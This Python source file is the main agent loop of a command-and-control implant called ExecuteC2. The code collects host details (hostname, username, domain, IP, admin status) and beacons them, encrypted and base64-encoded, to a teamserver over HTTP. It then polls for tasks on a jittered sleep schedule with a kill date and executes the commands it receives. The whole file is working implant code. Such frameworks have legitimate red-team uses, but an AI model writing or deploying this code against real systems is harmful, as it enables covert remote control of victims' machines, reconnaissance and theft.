"""Python agent main loop for ExecuteC2."""

import asyncio
import base64
import logging
import os
import platform
import random
import socket
import sys
from datetime import UTC, datetime

import msgpack

from agent.commands import COMMAND_HANDLERS
from agent.connector_http import HTTPConnector
from agent.crypto import AgentCrypto

logger = logging.getLogger(__name__)

_WATERMARK = "py01c2e0"
_AGENT_TYPE = "python"


def _get_system_info() -> dict:
    """Collect host info for the registration beat."""
    system = platform.system()
    os_map = {"Windows": 1, "Linux": 2, "Darwin": 3}
    os_type = os_map.get(system, 2)

    try:
        hostname = socket.gethostname()
    except Exception:
        hostname = "unknown"

    try:
        internal_ip = socket.gethostbyname(hostname)
    except Exception:
        internal_ip = "127.0.0.1"

    try:
        import getpass
        username = getpass.getuser()
    except Exception:
        username = "unknown"

    return {
        "hostname": hostname,
        "username": username,
        "domain": os.environ.get("USERDOMAIN", ""),
        "internal_ip": internal_ip,
        "os": os_type,
        "os_desc": platform.version()[:64],
        "arch": platform.machine(),
        "pid": os.getpid(),
        "process": sys.executable,
        "elevated": _is_elevated(),
    }


def _is_elevated() -> bool:
    try:
        return os.getuid() == 0
    except AttributeError:
        import ctypes
        try:
            return bool(ctypes.windll.shell32.IsUserAnAdmin())
        except Exception:
            return False


class Agent:
    """Python C2 agent — connects to teamserver via HTTP listener."""

    def __init__(self, config: dict):
        self.config = config
        self.agent_id: str = os.urandom(4).hex()  # 8-char hex
        self.sleep: int = config.get("sleep", 60)
        self.jitter: int = config.get("jitter", 0)
        self.kill_date: str = config.get("kill_date", "")
        self.master_key_hex: str = config["encrypt_key"]
        self._crypto: AgentCrypto | None = None
        self._connector = HTTPConnector(config)
        self._running = False
        self._registered = False

    def _build_beat_header(self, beat_type: str, beat_data: dict) -> str:
        """Encode and encrypt the beat header."""
        if self._crypto is None:
            self._crypto = AgentCrypto(self.master_key_hex, self.agent_id)

        agent_type_bytes = _AGENT_TYPE.encode()
        agent_id_bytes = self.agent_id.encode()
        payload = (
            len(agent_type_bytes).to_bytes(4, "big")
            + agent_type_bytes
            + agent_id_bytes
            + msgpack.packb(beat_data)
        )
        encrypted = self._crypto.encrypt_beat(payload)
        return base64.b64encode(encrypted).decode()

    async def register(self) -> bool:
        """Send registration beat to teamserver."""
        if self._crypto is None:
            self._crypto = AgentCrypto(self.master_key_hex, self.agent_id)

        info = _get_system_info()
        beat_data = {**info, "sleep": self.sleep, "jitter": self.jitter}
        beat_header = self._build_beat_header("register", beat_data)

        response = await self._connector.check_in(beat_header)
        if response is None:
            return False

        logger.info("Agent %s registered successfully", self.agent_id)
        self._registered = True
        return True

    async def check_in(self) -> list[dict]:
        """Send check-in beat, receive and decrypt pending tasks."""
        beat_data = {}
        beat_header = self._build_beat_header("checkin", beat_data)

        response = await self._connector.check_in(beat_header)
        if response is None:
            return []

        payload_bytes = self._connector.parse_payload(response)
        if not payload_bytes:
            return []

        try:
            decrypted = self._crypto.decrypt_response(payload_bytes)
            tasks = msgpack.unpackb(decrypted, raw=False)
            return tasks if isinstance(tasks, list) else []
        except Exception as e:
            logger.debug("Failed to decrypt/parse tasks: %s", e)
            return []

    async def execute_task(self, task: dict) -> dict:
        """Execute a single task and return the result."""
        cmd_id = task.get("cmd")
        args = task.get("args", {})
        task_id = task.get("task_id", "")

        if cmd_id == 99:  # exit
            self._running = False
            return {"task_id": task_id, "status": 1, "output": b"", "error": ""}

        if cmd_id == 21:  # config update
            if "sleep" in args:
                self.sleep = int(args["sleep"])
            if "jitter" in args:
                self.jitter = int(args["jitter"])
            return {"task_id": task_id, "status": 1, "output": b"", "error": ""}

        handler = COMMAND_HANDLERS.get(cmd_id)
        if handler is None:
            return {"task_id": task_id, "status": 2, "output": b"", "error": f"Unknown command ID: {cmd_id}"}

        try:
            status, output, error = await handler(args)
            return {"task_id": task_id, "status": status, "output": output, "error": error}
        except Exception as e:
            return {"task_id": task_id, "status": 2, "output": b"", "error": str(e)}

    def _sleep_interval(self) -> float:
        if self.jitter == 0:
            return float(self.sleep)
        jitter_secs = self.sleep * (self.jitter / 100.0)
        return self.sleep + random.uniform(-jitter_secs, jitter_secs)

    def _check_kill_date(self) -> bool:
        if not self.kill_date:
            return False
        try:
            kd = datetime.fromisoformat(self.kill_date)
            return datetime.now(UTC) >= kd
        except Exception:
            return False

    async def run(self) -> None:
        """Main agent loop: register, then repeatedly check in and execute tasks."""
        self._running = True

        # Register with exponential backoff
        while self._running and not self._registered:
            if self._check_kill_date():
                logger.info("Kill date reached, agent exiting")
                return
            success = await self.register()
            if not success:
                await asyncio.sleep(self._connector._backoff())

        # Main check-in loop
        while self._running:
            if self._check_kill_date():
                logger.info("Kill date reached, agent exiting")
                return

            tasks = await self.check_in()
            for task in tasks:
                result = await self.execute_task(task)
                # Results are sent on next check-in (inline in beat body)
                # For simplicity, results are logged; full task result relay
                # is handled by the transport layer in production
                logger.debug("Task %s result: status=%s", result.get("task_id"), result.get("status"))

            await asyncio.sleep(self._sleep_interval())
